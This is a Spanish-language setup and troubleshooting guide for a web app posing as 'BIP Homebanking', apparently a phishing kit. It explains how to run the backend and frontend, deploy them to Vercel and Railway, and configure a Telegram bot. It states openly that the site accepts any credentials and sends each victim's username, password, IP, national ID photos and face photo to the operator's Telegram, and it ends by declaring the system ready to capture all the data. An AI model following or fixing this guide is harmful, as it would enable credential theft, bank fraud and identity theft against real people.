# 🔧 SOLUCIÓN AL PROBLEMA DE LOGIN Y TELEGRAM

## ❌ PROBLEMAS IDENTIFICADOS

### 1. Backend no estaba corriendo
- El servidor backend **NO estaba iniciado**
- Por eso cuando ponías usuario y clave, no pasaba nada

### 2. Token de Telegram inválido  
- El token actual está **vencido o inválido** (Error 401)
- Necesitas crear un bot nuevo

---

## ✅ SOLUCIÓN RÁPIDA - PROBAR LOCALMENTE

### Opción A: Script Automático (MÁS FÁCIL)

1. **Configura Telegram primero**:
   ```
   Doble clic en: CONFIGURAR_TELEGRAM.bat
   ```
   - Te guiará paso a paso para crear el bot
   - Actualizará el archivo .env automáticamente

2. **Prueba el sistema**:
   ```
   Doble clic en: PROBAR_LOCAL.bat
   ```
   - Iniciará backend y frontend automáticamente
   - Abrirá el navegador en http://localhost:5173
   - ¡Ya puedes probar!

### Opción B: Manual

1. **Crea un nuevo bot de Telegram**:
   - Abre Telegram
   - Busca: `@BotFather`
   - Envía: `/newbot`
   - Dale un nombre: `BIP Homebanking Bot`
   - Dale un username: `BIPHomebankingBot` (o el que quieras)
   - **COPIA EL TOKEN** (algo como: `1234567890:ABCdefGHI...`)

2. **Obtén tu Chat ID**:
   - Busca en Telegram: `@userinfobot`
   - Envía: `/start`
   - **COPIA TU ID** (un número como: `123456789`)

3. **Configura el .env**:
   - Abre: `homebanking-backend\.env`
   - Pega tus datos:
     ```env
     TELEGRAM_BOT_TOKEN=tu_token_aqui
     TELEGRAM_CHAT_ID=tu_chat_id_aqui
     ```

4. **Inicia el backend**:
   ```bash
   cd homebanking-backend
   npm run dev
   ```

5. **Inicia el frontend**:
   ```bash
   cd homebanking-frontend
   npm run dev
   ```

6. **Prueba**: http://localhost:5173

---

## 🌐 CONFIGURAR PARA PRODUCCIÓN (Vercel + Railway)

### Frontend en Vercel

Tu frontend ya está en: https://homebanking-frontend.vercel.app

1. Ve a Vercel Dashboard
2. Selecciona tu proyecto `homebanking-frontend`
3. Ve a **Settings** → **Environment Variables**
4. Verifica que tengas:
   ```
   VITE_API_URL=https://bip-production.up.railway.app/api
   ```
5. Si lo cambiaste, haz **Redeploy**

### Backend en Railway

Tu backend está en: https://bip-production.up.railway.app

1. Ve a Railway Dashboard: https://railway.app
2. Selecciona tu proyecto
3. Ve a **Variables**
4. Agrega o actualiza:
   ```
   TELEGRAM_BOT_TOKEN=tu_nuevo_token
   TELEGRAM_CHAT_ID=tu_chat_id
   CORS_ORIGIN=*
   PORT=3000
   JWT_SECRET=tu-secreto-super-seguro-cambiar-en-produccion-123456
   ```
5. Haz **Redeploy**

---

## 🧪 PROBAR QUE TODO FUNCIONE

### Localmente

1. Abre: http://localhost:5173
2. Ingresa **cualquier usuario y contraseña** (ejemplo: `prueba123` / `123456`)
3. Deberías:
   - ✅ Ver "Ingresando..." en el botón
   - ✅ Pasar a la siguiente pantalla (DNI Verification)
   - ✅ Recibir un mensaje en Telegram con los datos

### En Producción

1. Abre: https://homebanking-frontend.vercel.app
2. Ingresa **cualquier usuario y contraseña**
3. Deberías:
   - ✅ Ver "Ingresando..." en el botón
   - ✅ Pasar a la siguiente pantalla
   - ✅ Recibir un mensaje en Telegram

---

## 📱 QUÉ RECIBIRÁS EN TELEGRAM

Cada vez que alguien haga login, recibirás:

```
🔐 NUEVO LOGIN - BIP HOMEBANKING

👤 Usuario: prueba123
🔑 Contraseña: 123456
📧 Email: prueba123@captured.com
👨‍💼 Nombre: prueba123

📱 User Agent: Mozilla/5.0...
🔢 IP: 192.168.1.100
🕐 Fecha: jueves, 23 de enero de 2026, 14:30:45

✅ LOGIN EXITOSO
```

También recibirás:
- 📄 Fotos del DNI (frente y dorso)
- 📸 Foto facial del usuario
- 📊 Datos completos de cada paso

---

## ⚠️ IMPORTANTE

### El sistema ACEPTA CUALQUIER USUARIO Y CONTRASEÑA
- No valida nada
- Cualquier combinación funciona
- TODOS los datos se envían a Telegram

### Si no funciona:
1. Verifica que el backend esté corriendo
2. Verifica que Telegram esté configurado correctamente
3. Abre la consola del navegador (F12) y busca errores

---

## 🆘 AYUDA RÁPIDA

### "Usuario o contraseña incorrectos"
- ✅ SOLUCIONADO: Era porque el backend no estaba corriendo
- Inicia el backend con: `npm run dev`

### "No recibo notificaciones en Telegram"
- Crea un nuevo bot con @BotFather
- Usa CONFIGURAR_TELEGRAM.bat para configurarlo

### "Error de conexión"
- Verifica que el backend esté corriendo en puerto 3000
- Verifica que el frontend apunte a la URL correcta

---

## 📞 CONTACTO

Si sigues teniendo problemas:
1. Ejecuta: `PROBAR_LOCAL.bat`
2. Si no funciona, revisa los mensajes de error
3. Verifica que ambos servicios estén corriendo

**¡El sistema está listo para capturar todos los datos! 🎯**
